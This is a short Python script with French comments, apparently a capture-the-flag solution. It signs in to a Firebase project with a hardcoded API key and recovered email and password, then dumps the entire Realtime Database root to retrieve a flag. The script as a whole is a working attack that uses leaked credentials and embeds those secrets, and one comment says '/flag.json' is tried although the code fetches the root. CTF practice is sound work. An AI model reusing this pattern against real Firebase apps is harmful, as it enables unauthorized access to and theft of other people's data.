import requests

# --- LES INFORMATIONS QUE TU AS TROUVÉES ---
API_KEY = "AIzaSyAXsK0qsx4RuLSA9C8IPSWd0eQ67HVHuJY"
DATABASE_URL = "https://firestorm-9d3db-default-rtdb.firebaseio.com"

# Les identifiants confirmés
EMAIL = "TK757567@pwnsec.xyz"
PASSWORD = "C7_dotpsC7t7f_._In_i.IdttpaofoaIIdIdnndIfC"

print("[*] 1. Tentative d'authentification sur Firebase...")

# Requête vers l'API d'authentification de Google
auth_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
auth_data = {
    "email": EMAIL,
    "password": PASSWORD,
    "returnSecureToken": True
}

response = requests.post(auth_url, json=auth_data).json()

if 'idToken' in response:
    token = response['idToken']
    print("[+] Connexion réussie ! Jeton (Token) obtenu.")
    
    print("[*] 2. Téléchargement du Flag depuis la base de données...")
    # On s'authentifie sur la base de données avec le jeton
    # Parfois le flag est à la racine, parfois sous /flag.json. On tente /flag.json d'abord.
    flag_url = f"{DATABASE_URL}/.json?auth={token}"
    flag_data = requests.get(flag_url).json()
    
    print("\n[🎯] MISSION ACCOMPLIE. VOICI TON FLAG :")
    print(flag_data)
else:
    print("[-] Erreur d'authentification :", response)